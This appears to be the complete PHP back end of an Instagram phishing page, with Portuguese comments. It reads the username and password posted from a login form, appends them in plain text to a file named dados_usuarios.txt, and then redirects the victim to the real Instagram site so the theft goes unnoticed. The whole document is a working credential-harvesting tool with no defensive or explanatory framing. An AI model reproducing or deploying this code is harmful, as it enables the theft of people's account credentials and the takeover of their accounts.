<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recupera os valores enviados pelo formulário
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Caminho para o arquivo onde os dados serão armazenados
    $file_path = "dados_usuarios.txt";

    // Formato dos dados a serem escritos no arquivo
    $data = "Username: $username - Password: $password\n";

    // Escreve os dados no arquivo
    if (file_put_contents($file_path, $data, FILE_APPEND | LOCK_EX) !== false) {
        // Redireciona o usuário para o Instagram após passar as credenciais
        header("Location: https://www.instagram.com/");
        exit;
    } else {
        echo "Ocorreu um erro ao armazenar os dados.";
    }
} else {
    // Se não foram enviados via POST, redireciona para o formulário
    header("Location: index.html");
    exit;
}
?>

